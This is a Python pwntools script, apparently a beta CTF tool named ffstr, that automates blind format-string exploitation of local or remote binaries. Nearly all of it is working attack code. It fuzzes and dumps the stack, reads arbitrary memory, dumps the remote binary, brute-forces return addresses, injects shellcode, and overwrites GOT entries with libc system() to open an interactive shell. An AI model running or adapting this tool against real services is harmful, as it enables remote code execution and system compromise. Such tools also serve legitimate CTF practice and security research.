from pwn import *
from time import *
from random import *
from string import *
from binascii import *

import re


class ffstr():
	# Full Format STRing exploitation
	
	def __init__(self):
		
		# Input/Output from/torwards tested the binary
		self.io 	= None
		
		# Reference for ELF property reading
		self.elf	= None
		
		# Store challenge location
		self.location 	= None
		
		# Connection data
		self.path 	= None
		self.ip		= None
		self.port	= None
		
		# Assess chall behavior
		self.behavior 	= None
		self.blind_behavor = None
		
		# 32 or 64 bites
		self.bits 	= None
		self.block_byte	= None
		
		# Stack
		self.stack	= None
		self.stack_arg	= None
		
		# ELF Position
		self.start	= None
		
		# Stack address
		self.addr	= None
		
		# Write Calibration
		self.calibration = None
		
		# Format string delimiters
		self.delimiters = [b"   d34d|",b"|b33f   "]
		
		# Regular Expression Pattern
		self.re_HexaPattern 	= b'(0[xX][0-9a-fA-F]+)|(\(n.l?\))'
		self.re_FlagPattern  	= b"[a-zA-Z0-9]+\{\S+\}"
		self.re_ArgPattern	= b"%[0-9]+\$[a-zA-Z]{0,2}"
		
		# Checking if PIE
		self.pie =  None
		
		# Open Libc
		self.libc = None
		
		# Dump binary
		self.dump_name = None
		
		# Timeout between connection
		self.timeout = None
		
		# Anti DoS
		self.last_request = None
		self.nb_request   = None
		self.rate_limit	  = 100
		
		# Complementary argument
		self.future_args = []
		
	def getArgs(self):
		# Get args from pwntools

		# How to access to the challenge
		if args["BINARY"].find(":") > -1 :
			self.location = "remote"
			self.ip, self.port = args["BINARY"].split(":")
		else:
			self.location = "local"
			self.path = args["BINARY"]
			
		# Supporting ELF file
		if "ELF" in args.keys():
			self.elf  = ELF(args["ELF"])
		
		# 32bits or 64 bits
		if "BITS" in args.keys():
			if args["BITS"] == "32":
				self.bits = 32
				self.block_byte = 4
				context.arch = 'i386'
			else:
				self.bits = 64
				self.block_byte = 8
				context.arch = 'amd64'
		else:
				# By default
				self.bits = 64
				self.block_byte = 8
				context.arch = 'amd64'
				
		# Timeout setting
		if "TOUT" in args.keys():
			self.timeout = float(args["TOUT"]) 
		else:
			self.timeout = 0.25
			
		# DBG setting
		if "DBG" not in args.keys():
			context.log_level = 'error'

		# Rate Limiting setting
		if "RL" in args.keys():
			if int(args["RL"])>1:
				self.rate_limit = int(args["RL"])
			else:
				self.rate_limit = 100
				
		# Format String stack argument recovering
		if "STACKARG" in args.keys():
			self.stack_arg = int(args.STACKARG)
			
		# ELF position
		if "START" in args.keys():
			i,guess = args.START.split(":")
			self.start = (int(i),int(guess,16))
			
		# Reload DUMPED FILE
		if "DUMPED" in args.keys():
			self.dump_name = args.DUMPED
			
		# Stack address
		if "STACKADR" in args.keys():
			addr,offset= args.STACKADR.split(":")
			self.addr = (int(addr),int(offset))
			
		# Write Calibration
		if "CALIB" in args.keys():
			self.calibration = int(args.CALIB)
			
		# Check PIE
		if "PIE" in args.keys():
			self.pie = int(args.PIE,16)
			
		# Check LIBC
		if "LIBC" in args.keys():
			self.libc = args.LIBC
			
	def set_future_args(self,txt):
		self.future_args.append(txt)
		print("To save time on next run please use " + " ".join(self.future_args))
				
	def yesno(self):
		# yes or no for further analysis
		return input("Continue y/n :").strip().lower() == "y"
		
	def connect(self):
		# Connection to the chall
		if self.location == "local":
			self.io = process(self.path)
		else:
			# connection to a remote server
			self.io = remote(self.ip,self.port)
			
		# avoid DoS by manual validation every 100 request
		if self.nb_request is None:
			self.nb_request = 1
		self.nb_request += 1
		if self.nb_request % self.rate_limit == 0:
			self.yesno()
			
		# Too rapid connection trigger too a slow down
		if self.last_request is None:
			self.last_request = 0
		_time = time()
		if _time - self.last_request < self.timeout:
			sleep(self.timeout)
		self.last_request = _time

	def close(self):
		# Close connection
		self.io.close()
		
	def locateFuzzed(self,data,fuzz):
		# locate fuzzed value and provide markers

		# For each fuzzed values
		for i,elt in enumerate(fuzz):
		
			# Check each line
			for line in data.split(b"\n"):
			
				# if fuzzed value is found	
				if line.find(elt)>0:
					# Left & Right
					pos = line.find(elt)
					#self.delimiters = (line[:pos],line[pos+len(elt):])
		
	def mimic(self,sequence,payload,fake=b"a"):
		# Mimic the software behavior from observe behavior
		
		# Connect tubes
		self.connect()
	
		# Proposing fuzzed injection when recv in awaiting data
		n = 0
		while  n < len(sequence) and self.io.connected():
			if sequence[n] and len(payload) > 0:
				pl = payload.pop(0)
				self.io.sendline(pl)
			else:
				self.io.sendline(fake)
			n += 1

		# One liner for dumping all the received data
		data = self.io.recvall(timeout=self.timeout)

		return n,data
		
	def mentalist(self,nb_input=5):
	
		# Return a list of injectable parameters
		print("You have called the mentalist ...")
		
		# Generate fuzzed string for injection E41aF
		fuzz = [ "".join(choices(hexdigits,k=5)).encode() for i in range(nb_input)]
		_fuzz = []
		_fuzz.extend(fuzz)
		
		# Get as much output as possible, send all fuzzed values
		n,data = self.mimic([True]*nb_input,_fuzz)
		
		# Assess reflected data
		self.blind_behavior = []
		for i,elt in enumerate(fuzz):
			if data.find(elt)>0:
				print("Parameter "+str(i+1)+" is reflected ")
				self.blind_behavior.append(True)
			elif i >= n:
				break
			else:
				self.blind_behavior.append(False)
				
		# Locate Fuzzed Value
		self.locateFuzzed(data,fuzz)
		
		# Set behavior as a sequence of succesfull reflected input
		print("Behavior defined ...")
		
		# checking injection by search hexa pattern is format string has succeede
		for i in range(len(self.blind_behavior)):
			_seq = [False] * len(self.blind_behavior)
			_seq[i] = True
			_payload = [b"%1$p"]
			n,data = self.mimic(_seq,_payload,fake=b"a")
			proof = re.findall(self.re_HexaPattern, data)
			if proof:
				self.blind_behavior[i] = True
			else:
				self.blind_behavior[i] = False
				
		# Final
		print("Behavior validated ...")

		
		# close the connection
		self.close()
		
	def stackPayload(self,n,var,size=8,left=b"",right=b""):
		# Return a stack read payload of constant size
		payload = left+b"%"+str(n).encode()+b"$"+var+right+b" "*size
		payload = payload[:size+len(left)+len(right)]
		return payload
		
	
	def stackDump(self,nb_elt=100):
		# Dump the stack, maximum of nb_elt element
		
		print("Dumping stack ...")
		
		# Store the stack
		self.stack	= []
		
		# Generate Payloads
		payload = [self.stackPayload(i+1,b"p",8,left=self.delimiters[0],right=self.delimiters[1]) for i in range(nb_elt)]

		# Monitoring payload consumption done in mimic
		while len(payload)>0:
			
			# Mimic behavior
			n,data = self.mimic(self.blind_behavior,payload,fake=b"a")
			
			# Find the hexa pattern
			m = re.findall(self.re_HexaPattern, data)
			
			# Extract hexadecimal number
			for elt in m:
				self.stack.append(b"".join(elt))
			
			# In case of no regex
			if m is None:
				self.stack.append(b"0x"+b"00"*self.bloc_byte)
		
		print(str(len(self.stack))+" stack elements recovered")

	def checkflag(self,txt):
		# Regex generic flag format
		flags = re.findall(self.re_FlagPattern, txt)
		if flags:
			for flag in flags:
				print(flag)
				
				# Continue or not ?
				if not self.yesno():
					exit(1)

	def checkfstr(self,txt):
		
		# Lazy 
		if self.stack_arg is not None:
			return
			
		# use regex to find the payload		
		fmts = re.findall(self.re_ArgPattern, txt)
		if fmts:
			self.stack_arg = None
			for fmt in fmts:
				beg = fmt.find(b"%")
				end = fmt.find(b"$")
				self.stack_arg = int(fmt[beg+1:end])
				print("Stack Argument is in position "+str(self.stack_arg)+" ("+fmt.decode()+")")
				self.set_future_args("STACKARG="+str(self.stack_arg))
				
	def hex2bytes(self,h,order):
		# convert hex to byte
		try:
			return int(h,16).to_bytes(self.block_byte,order)
		except:
			return int("0x0",16).to_bytes(self.block_byte,order)
			
	def stackAnalyze(self):
		
		## Stage 0 - Get a copy of self.stack
		_stack = []
		_stack.extend(self.stack)
		
		## Stage 1 - Locate useful info on the stack
		txt = b""
		for elt in _stack:
			txt += self.hex2bytes(elt,"little")

		# Showing Hexdump
		print(hexdump(txt))
		
		# Checking flag
		self.checkflag(txt)
	
		# Regex generic stack payload
		self.checkfstr(txt)
		
	def unOffset(self,eip):
		# support function find the offset from the binary starts \x7fELF...
		
		# Provide testing offset
		offset = []
		
		# Threshold
		trd = 0x0fff
		
		# Bruteforce
		msk = 0x1000

		# Converting
		try:
			eip = int(eip,16)
		except:
			return offset
		
		# If guessed not to be an eip
		if eip > trd:
			# Get the base
			eip =  (eip & trd)
			# bruteforce value
			for i in range(16):
				offset.append(eip+i*msk)
		else:
			return offset
			
		return offset
			
	def asyncExchange(self,exploit,fake=b"a"):
		# Step by Step Exchange with binary for leaking and exploitation purpose
		# self.behavior counts exchanged step
		
		# Check if io has been instanciated
		if self.io is None:
			self.connect()
			
			# re-Initiate behavior
			self.behavior = 0
			
		# Check if io is connected
		if not self.io.connected():
			self.connect()
			# re-Initiate behavior
			self.behavior = 0
		
		# Send message accordingly
		if self.blind_behavior[self.behavior %  len(self.blind_behavior)]:
			self.io.sendline(exploit)
		else:
			self.io.sendline(fake)

			
		# Increase behavior, change conditions
		self.behavior += 1
		
		# Wait a limited time
		ti = time()
		data = b""
		## do go above timeout and is still connected
		while time()-ti < self.timeout and self.io.connected():
			try:
				data += self.io.recvline(timeout=self.timeout)
			except:
				# Cleaning + provide delimiters to cacth something and avoid infinite loop
				data += self.io.recvall()+b"".join(self.delimiters)
				break
		
		# return finding
		return data
		
		
	def readAnywhere(self,addr,minsize=8,leftpad="",rightpad=""):	
		# Format String Read Anywhere payload
		
		# Calculte shifting of stack arg due to padding
		L = len(rightpad)+minsize
				
		if self.bits == 32:
			pos_arg = self.stack_arg+ L // 4
			pl = self.stackPayload(pos_arg,b"s",size=8,left=leftpad,right=rightpad)+p32(addr)
		else:
			pos_arg = self.stack_arg+ L // 8
			pl = self.stackPayload(pos_arg,b"s",size=8,left=leftpad,right=rightpad)+p64(addr)
		
		return pl
		
	def stackGPS(self,n=100):
	
		# Lazy mode
		if self.addr is not None:
			return
			
		# find stack address and relate to the format string injection address
		print("Stack localisation ...")
		
		# Use previous acquired stack values for offset bruteforcing
		for i in range(len(self.stack)):
		
			# check n adress below
			for k in range(n): 
				
				# in both direction d
				for d in [-1]:
				
					# Leak an hexadecimal value
					leak = None
					while leak is None:
						data = self.asyncExchange(self.stackPayload(i+1,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
						regex = re.search(self.re_HexaPattern, data)

						if regex:
							try:
								leak = int(regex[0],16)
							except:
								self.close()
								break
						else: 
							self.close()
							break
							
					# failsafe for leak
					if leak is None:
						continue
					
					# in case of negative value
					if leak+d*self.block_byte*k <= 0:
						self.close()
						continue
					
					# Read anywhere format string
					try:
						pl = self.readAnywhere(leak +d*self.block_byte*k,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
					except:
						continue
					
					# Get Data
					data = b""
					while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
						data = self.asyncExchange(pl)
					
					print("Leak "+hex(leak+d*self.block_byte*k)+" ",str(i)," ",str(d)," ",data[:35],end="\r")
					
					
					if data.find(self.delimiters[0]*2)>-1:
						print("Leak "+hex(leak+d*self.block_byte*k)+" ",str(i)," ",str(d)," ",data[:35])
						print("Found at argument ",i+1," offset ", d*self.block_byte*k)
						print(data)
						self.addr=(i+1,d*self.block_byte*k)
						self.set_future_args("STACKADR="+str(i+1)+":"+str(d*self.block_byte*k))
						return
					
					# Leak 0x7ffce61c00c8  17   -1   b'\nHello there, \n   d34d|%9$s|b33f
					# Leak 0x7ffc47e93e18  17   -1   b'\nHello there, \n   d34d|%9$s|b33f   '
					if re.findall(self.re_ArgPattern, data):
						print("Leak "+hex(leak+d*self.block_byte*k)+" ",str(i)," ",str(d)," ",data[:35])
						print("*Found at argument ",i+1," offset ", d*self.block_byte*k-len(self.delimiters[0]))
						print(data)
						self.addr=(i+1,d*self.block_byte*k-len(self.delimiters[0]))
						self.set_future_args("STACKADR="+str(i+1)+":"+str(d*self.block_byte*k-len(self.delimiters[0])))
						return
					
	def calibrateStackWrite(self,n=100): # check for 64 bits
	
		# Lazy mode
		if self.calibration is not None:
			return
		
		print("Writing calibration ")
		
		# Checking the number of previous characters
		for nbw in range(n):
			
			# Testing several stack location for stability (avoid any overwriting)
			for k in range(64):
			
				# Stack Saved rbp
				stackrbp,offset = self.addr
				
				# Closing connection
				self.close()
				
				# Leak an hexadecimal value
				leak = None
				
				data = self.asyncExchange(self.stackPayload(stackrbp,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
				regex = re.search(self.re_HexaPattern, data)
				if regex:
					try:
						leak = int(regex[0],16)
					except:
						self.close()
						break
				
				# write format string
				if self.bits == 32:
					write={leak+k*self.block_byte:0x41414141}
					pl = b"B"*8+fmtstr_payload(self.stack_arg, write, numbwritten=nbw,write_size="short")
				else:
					write={leak+k*self.block_byte:0x4141414141414141}
					pl = b"B"*8+fmtstr_payload(self.stack_arg, write, numbwritten=nbw,write_size="short")
					
				# Get Data
				data = b""
				data = self.asyncExchange(pl)
				
				print(".",end="")
				
				# Read and check if calibrated
				_leak = None
				while _leak is None:
					data = self.asyncExchange(self.readAnywhere(leak+k*self.block_byte,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])) 
					regex = re.search(self.re_HexaPattern, data)
					try:
						_leak = regex[0]
					except:
						self.close()
						break
				
				if data.find(b"AAAA")>-1:
					print("Writing calibration found : "+str(nbw+1-8))
					self.set_future_args("CALIB="+str(nbw+1-8))
					self.calibration = nbw+1-8
					return
				
	def checkshell(self):
		# Check if we have access to a shell
		try:
			for i in range(5):
				self.io.sendline(b"id")
				data = self.io.recvline()
				if data.find(b"uid=")>-1:
					self.io.interactive()
		except:
			pass
			
	def ret2win(self):
		# Return to win attack
		
		# Choice
		print("Perfom blind ret2win ?")
		if not self.yesno():
			return
			
		# Close range of IP
		for i in range(256): 
		
			# increase of decrease rip 
			for d in [1,-1]:
			
				# Stack Saved rbp
				stackrbp,offset = self.addr
					
				# Closing connection
				self.close()
				
				# Calculating position
				pos = -offset // self.block_byte + self.stack_arg - len(self.delimiters[0]) // self.block_byte
				
				# Leak an hexadecimal value // stack address
				data = self.asyncExchange(self.stackPayload(pos,b"p",left=self.delimiters[0],right=self.delimiters[1])) 
				regex = re.search(self.re_HexaPattern, data)
				stack = int(regex[0],16)
				
				# Leak an hexadecimal value // rip
				data = self.asyncExchange(self.stackPayload(pos+1,b"p",left=self.delimiters[0],right=self.delimiters[1])) 
				regex = re.search(self.re_HexaPattern, data)
				rip = int(regex[0],16)

				print("Read stack @ ",hex(stack)," Old Instruction Pointer ",hex(rip)," New Instruction Pointer ",hex(rip+d*i),end="\r")
				
				# write format string
				write={stack+self.block_byte:rip+d*i}
				pl = self.delimiters[0]+fmtstr_payload(self.stack_arg, write, numbwritten=self.calibration+7,write_size="short")

				# Get Data
				data = self.asyncExchange(pl)
				
				# Checking Flag
				self.checkflag(data)
				
				# Checking Shell
				self.checkshell()

	def stackshellcode(self):
		# injection shellcode on the stack and re-route the program to it
		
		# Choice
		print("Perfom shellcode injection ?")
		if not self.yesno():
			return
			
		# if stack address has not been identified
		if self.addr is None:
			return
		
		for k in range(256):

			# Shellcode
			shellcode = asm(shellcraft.sh())

			# Stack Saved rbp
			stackrbp,offset = self.addr

			# Closing connection
			self.close()
						
			# Calculating position
			pos = - offset // self.block_byte + self.stack_arg - len(self.delimiters[0]) // self.block_byte 
						
			# Leak an hexadecimal value // stack address
			data = self.asyncExchange(self.stackPayload(pos,b"p",left=self.delimiters[0],right=self.delimiters[1])) 
			regex = re.search(self.re_HexaPattern, data)
			stack = int(regex[0],16)

			# write format string, bruteforce shellcode begining
			write={stack+self.block_byte:stack-k*4}

			# Write Instruction Pointer for returning to injected shellcode
			pl = self.delimiters[0] + fmtstr_payload(self.stack_arg, write, numbwritten=self.calibration+7,write_size="short")+shellcode
			data = self.asyncExchange(pl)
			
			# inform user
			print("Searching shellcode at : "+str(k*4),end="\r")
			
			# Check shell
			self.checkshell()

			
	def locateBinary(self):
		# Locate return_pointer, define offset and identify program header
		
		# Working on a stack copy
		if self.blind_behavior.count(True) < 2 :
			print("Cannot Leak ...")
			return
		
		# Lazy mode, don"t redo thing
		if self.start is not None:
			return
			
		print("Locating Binary ...")
		
		# Storing start file offset
		self.start = []
		
		# Use previous acquired stack values for offset bruteforcing
		for i,st in enumerate(self.stack):
		
			# Generate a set of offset to be tested
			guessed = self.unOffset(st)
			
			# Guess each offset from "guessed" list
			for guess in guessed:
				
				# Leak an hexadecimal value
				leak = None
				while leak is None:
					data = self.asyncExchange(self.stackPayload(i+1,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
					regex = re.search(self.re_HexaPattern, data)
					if regex:
						try:
							leak = int(regex[0],16)
						except:
							self.close()
							break
						
				print("Leak "+hex(leak)+" ... Offset "+hex(guess),end="\r")
				
				# Read anywhere format string
				pl = self.readAnywhere(leak - guess,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])

				# in case of negative value
				if leak-guess <= 0:
					continue
					
				# Get Data
				data = b""
				while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
					data += self.asyncExchange(pl)

				
				# ELF Header
				if data.find(b"\x7fELF") > -1:
					self.start = (i+1 ,guess) 
					print(hex(leak),i+1,hex(guess),data)
					self.set_future_args("START="+str(i+1)+":"+hex(guess))
					self.close()
					return

					
				# Close connexion
				if not all(self.blind_behavior):
					self.close()
			
			
	def PIE(self):
	# Check if PIE is enabled
	
		# Lazy mode, don't redo things
		if self.pie is not None:
			return
			
		# Gathering information
		info = []
		for _ in range(2):
					
			# Get location
			i , offset = self.start
			
			# Leak an hexadecimal value
			leak = None
			while leak is None:
				data = self.asyncExchange(self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
				regex = re.search(self.re_HexaPattern, data)
				if regex:
					leak = hex(int(regex[0],16)-offset)
					
			# info gathering
			info.append(leak)
		
		if info[0] == info[1]:
			self.set_future_args("PIE="+info[0])

			
	def dumpBinary(self):
	
		# Choice
		print("Perfom binary dump ?")
		if not self.yesno():
			return

		# Lazy mode, don't redo things
		if self.dump_name is not None:
			return
		
		# Dump Binary
		print("Dumping Binary ...")
		
		# Binary
		binary = b""
		
		# Working on a stack copy
		if self.elf is not None:
			print("No need to dump the binary ...")
			return
			
		# Unique name for the dump binary
		self.dump_name = str(int(time()))
		self.set_future_args("DUMPED="+self.dump_name)
		
		
		# Byte per Byte
		n = 0
		pwntool_not_happy = True
		while pwntool_not_happy:
				
			# Get location
			i , offset = self.start
			
			# Leak an hexadecimal value
			leak = None
			while leak is None:
				data = self.asyncExchange(self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
				regex = re.search(self.re_HexaPattern, data)
				if regex:
					leak = int(regex[0],16)
						
			# Read anywhere format string
			pl = self.readAnywhere(leak - offset + n,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
			
			# test is \n is present in generated payload
			if pl.find(b"\n")>-1:
				binary += b"\x00"
				n+=1
				continue
				
			# Get Data
			data = b""
			while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
				data += self.asyncExchange(pl)


			left = data.find(self.delimiters[0])+len(self.delimiters[0])
			right= data.find(self.delimiters[1])
			
			# Extract data 
			if left >-1 and right >-1:
				dump =data[left:right]
				L = len(dump)
				if L != 0 and dump != b"(null)" and dump != b"(nil)":
					binary += dump[:1]
					n+= 1
				else:
					binary += b"\x00"
					n += 1
				
			# Close connexion
			if not all(self.blind_behavior):
				self.close()

			# dump regularly ~ 160 bytes
			if len(binary) % 160 == 0 and len(binary) != 0:
			
				# show dump
				print(hexdump(binary[-160:]))
				
				# dump to file
				with open(self.dump_name,"wb") as fp:
					fp.write(binary)
					
				# assess pwntools happiness
				try:
					self.elf=ELF(self.dump_name)
					pwntool_not_happy = False
				except:
					self.elf = None

	def showSymbols(self):
		# Read binary symbols
		
		# Working on a stack copy
		if self.elf is None:
			print("No ELF as support ...")
			return
		
		# Say hello
		print("Show symbols ...")
		
		# read each symbols
		for sym in self.elf.symbols.keys():
			
			# Get location
			i , offset = self.start
			
			# symbol addr
			addr = self.elf.symbols[sym]
			
			# Leak an hexadecimal value
			leak = None
			while leak is None:
				data = self.asyncExchange(self.stackPayload(i+1,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
				regex = re.search(self.re_HexaPattern, data)
				if regex:
					leak = int(regex[0],16)
					
			print("Leak "+hex(leak)+" ... Offset "+hex(offset)+" "+sym+" "+hex(addr),end="\r")
					
			# address correction if no PIE
			if not self.elf.pie:
				addr -= leak-offset
				
			# Read anywhere format string
			pl = self.readAnywhere(leak - offset + addr,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
			
			# test is \n is present in generated payload
			if pl.find(b"\n")>-1:
				continue
				
			# Get Data
			data = b""
			while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
				data = self.asyncExchange(pl)


			left = data.find(self.delimiters[0])+len(self.delimiters[0])
			right= data.find(self.delimiters[1])
			
			# Extract data 
			if left >-1 and right >-1:
				dump =data[left:right]
				print(dump,end="\r")

			# Checking flag
			self.checkflag(dump)
				
			# Close connexion
			if not all(self.blind_behavior):
				self.close()
	
	def vanillaGOT(self):
		# Exploit GOT overwriting having both chall binary and libc
		
		# Checking conditions
		if self.elf is None:
			print("No binary provided as argument : ELF = ")
			return
		if self.libc is None:
			print("No libc binary provided : LIBC = ")
			return
		
		# Say hello
		print("Vanilla GOT hijack ...")
		if not self.yesno():
			return
			
		# Accessing libc	
		libc = ELF(self.libc)

		# Closing the current connection
		self.close()
			
		# Get location
		i , offset = self.start
			
		# If PIE
		if self.pie is None:
			# Leak an hexadecimal value
			leak = None
			while leak is None:
				data = self.asyncExchange(self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
				regex = re.search(self.re_HexaPattern, data)
				if regex:
					leak = int(regex[0],16) - offset
		else:
			leak = self.pie
				
		# Find puts (more stable than printf)
		plt_got = self.elf.symbols["got.puts"]

		# Read anywhere format string
		pl = self.readAnywhere(plt_got,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
			
		# Get libc puts leak
		data = self.asyncExchange(pl)

		# Extract leak
		left = data.find(self.delimiters[0])+len(self.delimiters[0])
		right= data.find(self.delimiters[1])
		dump =data[left:right][:self.block_byte]
		
		# Calculation libc base from puts leak
		base =  int("0x"+dump[::-1].hex(),16) - libc.symbols["puts"]

		# Overwrite printf
		sys = base + libc.symbols["system"]
		printf = self.elf.symbols["got.printf"]

		if printf < self.pie:
			printf += self.pie
		
		# Write What Where
		write={printf:sys}
		
		# Write Instruction Pointer for returning to injected shellcode
		pl = self.delimiters[0] + fmtstr_payload(self.stack_arg, write, numbwritten=self.calibration+7,write_size="short")
		data = self.asyncExchange(pl)
		
		# Ask for /bin/sh
		self.asyncExchange(b"/bin/sh")
		
		# interative
		self.io.interactive()

		
	def showGOT(self):
		# leak libc adress
		# ldd --version ldd 
		# objdump --dynamic-reloc ffstrlab64 
		
		# if we have access to the elf
		if "ELF" in args.keys():
			dumped = args["ELF"]
			
		# unless scavenger way
		else:
			dumped = self.dump_name
			
		# Dump opening
		with open(self.dump_name,"rb") as fp:
			data = fp.read()
			
		# Strings	
		strings = [ elt[:-1] for elt in re.findall(b"([a-zA-Z0-9._-]{3,50}\x00)", data)]
			
		# Got address 
		got = [ (elt,data.find(elt)) for elt in re.findall(b"\xff\x25....\x68", data)]
			
		print(strings)
		print("\nPlease do your best to identify the Libc, and use LIBC=your_libc_here.so\n")
		
		k=0
		for plt,rip in got:
		
			# Get location
			i , offset = self.start
			
			# Leak an hexadecimal value
			leak = None
			while leak is None:
				data = self.asyncExchange(self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
				regex = re.search(self.re_HexaPattern, data)
				if regex:
					leak = int(regex[0],16)
				
			# relocate 		
			plt_got = int(plt[2:-1][::-1].hex(),16)
			if plt_got < leak-offset:
				plt_got += leak-offset+rip+6 # check why

			
			# Read anywhere format string
			pl = self.readAnywhere(plt_got,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])

			
			# Get Data
			data = b""
			while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
				data += self.asyncExchange(pl)

			left = data.find(self.delimiters[0])+len(self.delimiters[0])
			right= data.find(self.delimiters[1])
			dump =data[left:right]
			print(">> ",hex(plt_got),dump[::-1].hex())
		print("\n")
			
	def hijackGOT(self):
	
		# Lazy mode, don't redo things
		if self.libc is None:
			return
		
		# Say hello
		print("Perfom hard-way GOT hijack ...")
		if not self.yesno():
			return
			
		# Not clean, but does the work
		self.libc = ELF(self.libc)
		
		# if we have access to the elf
		if "ELF" in args.keys():
			dumped = args["ELF"]
		# unless scavenger way
		else:
			dumped = self.dump_name
			
		# Dump opening
		with open(self.dump_name,"rb") as fp:
			data = fp.read()
			
		# Strings	
		strings = [ elt[:-1] for elt in re.findall(b"([a-zA-Z0-9._-]{3,50}\x00)", data)]
			
		# Got address 
		got = [ (elt,data.find(elt)) for elt in re.findall(b"\xff\x25....\x68", data)]
			
		# puts
		#plt,rip = got[0]
		func = input("Which function to use for libc relocation (puts) ? ").strip()
		entry = int(input("To which entry it correspod (0-N) ? :"))
		
		
		plt,rip = got[entry]
		
		# cleaning connection
		self.close()
			
		# =====

		# Get location
		i , offset = self.start
			
		# If PIE
		if self.pie is None:
			# Leak an hexadecimal value
			leak = None
			while leak is None:
				data = self.asyncExchange(self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
				regex = re.search(self.re_HexaPattern, data)
				if regex:
					leak = int(regex[0],16) - offset
		else:
			leak = self.pie

		# relocate 		
		plt_got = int(plt[2:-1][::-1].hex(),16)
		if plt_got < leak:
			plt_got += leak + rip + 6 # +6 to correct the ip for next instruction
			
		# Read anywhere format string
		pl = self.readAnywhere(plt_got,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
			
		# Get libc puts leak
		data = self.asyncExchange(pl)

		# Extract leak
		left = data.find(self.delimiters[0])+len(self.delimiters[0])
		right= data.find(self.delimiters[1])
		dump =data[left:right][:self.block_byte]
		
		# Calculation libc base from puts leak
		base =  int("0x"+dump[::-1].hex(),16) - self.libc.symbols[func]
		
		# relocate 		
		plt_got = int(plt[2:-1][::-1].hex(),16)
		if plt_got < leak:
			plt_got += leak + rip + 6 # +6 to correct the ip for next instruction
			
		# Overwrite printf
		sys = base + self.libc.symbols["system"]
		_entry = int(input("Which entry correspond to printf (0-N) ? :"))
		
		# Write What Where
		write={plt_got+(_entry-entry)*self.block_byte:sys}
		
		# Write Instruction Pointer for returning to injected shellcode
		pl = self.delimiters[0] + fmtstr_payload(self.stack_arg, write, numbwritten=self.calibration+7,write_size="short")
		data = self.asyncExchange(pl)
		
		# Ask for /bin/sh
		self.asyncExchange(b"/bin/sh")
		
		# interative
		self.io.interactive()
		


def help():
	print(
	"""
	!!! WARNING BETA VERSION !!!
	
	Usage python3 ffstr.py options
	
	Options:
	
	BINARY          Link to the chall either as a path ./chall or url 127.0.0.1:1337
	ELF             Link to the supporting elf file, path only
	BITS            32 or 64 bits
	TOUT		Timeout in seconds ex: 0.25
	
	Examples:
	
	python3 ffstr.py BINARY=127.0.0.1:1337 BITS=64 ELF=./ffstr64
	python3 ffstr.py BINARY=127.0.0.1:1337 BITS=32 ELF=./ffstr32
	python3 ffstr.py BINARY=./ffstr64 BITS=64 ELF=./ffstr64
	python3 ffstr.py BINARY=./ffstr32 BITS=32 ELF=./ffstr32
	""")
if __name__ == "__main__":
	
	# Help menu
	if not args:
		help()
		exit()
		
	# ffstr instanciation
	exploit = ffstr()
	exploit.getArgs()
	exploit.mentalist(nb_input=10)
	exploit.stackDump(nb_elt=200)
	exploit.stackAnalyze()
	exploit.stackGPS()
	exploit.calibrateStackWrite()
	exploit.ret2win()
	exploit.stackshellcode()
	exploit.locateBinary()
	exploit.PIE()
	exploit.dumpBinary()
	exploit.showSymbols()
	exploit.vanillaGOT()
	exploit.showGOT()
	exploit.hijackGOT()

